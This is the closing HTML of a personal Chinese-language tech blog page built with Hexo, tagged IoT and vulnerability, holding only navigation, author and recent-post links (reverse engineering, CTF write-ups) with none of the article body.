+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IoT/">IoT</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/03/Python/Python-Adv-learning/" title="Python Adv learning"><img class="cover" src="https://s2.loli.net/2024/02/20/9JkbzViQC6hyfW5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python Adv learning</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/15/Reverse/unidbg-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="unidbg 学习笔记"><img class="cover" src="https://s2.loli.net/2024/02/20/i5askw6xYVRKDtE.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">unidbg 学习笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/05/04/Zav4zFVukLJMBKI.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">devoke</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/03/Reverse/lighthouse%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="lighthouse 使用指南">lighthouse 使用指南</a><time datetime="2024-03-03T15:45:14.000Z" title="发表于 2024-03-03 23:45:14">2024-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/19/Life/ES%E5%B0%8F%E4%B8%BB%E6%9C%BA%E6%8A%98%E8%85%BE%E8%AE%B0/" title="ES小主机折腾记">ES小主机折腾记</a><time datetime="2024-02-19T03:05:01.000Z" title="发表于 2024-02-19 11:05:01">2024-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/20/WriteUp/HFCTF2022-RE/" title="HFCTF2022 RE">HFCTF2022 RE</a><time datetime="2022-03-20T12:04:53.000Z" title="发表于 2022-03-20 20:04:53">2022-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/09/WriteUp/%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%E5%AF%86%E7%A0%81%E9%A2%98/" title="简简单单密码题">简简单单密码题</a><time datetime="2022-03-09T12:08:44.000Z" title="发表于 2022-03-09 20:08:44">2022-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/03/Python/Python-multiprocess-learning/" title="Python multiprocess learning">Python multiprocess learning</a><time datetime="2022-02-03T06:25:30.000Z" title="发表于 2022-02-03 14:25:30">2022-02-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2024/02/20/i5askw6xYVRKDtE.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By devoke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/"></script><script src="/"></script><script src="/"></script><div class="js-pjax"></div></div></body></html>
